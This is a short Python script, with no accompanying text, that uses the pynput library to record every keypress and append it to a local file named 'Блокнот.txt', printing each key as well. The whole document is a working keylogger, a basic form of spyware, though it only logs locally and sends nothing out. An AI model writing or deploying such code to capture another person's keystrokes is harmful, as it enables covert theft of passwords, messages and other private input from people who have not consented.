from pynput import keyboard
from datetime import datetime

def on_press(key):
    f = open("Блокнот.txt", "a")
    dt=datetime.now()
    try:
        print(f"{key.char} ")
        f.write(f"{key.char} ")
    except AttributeError:
        print(f"{key} ")
        f.write(f"{key} ")
    f.close()



with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
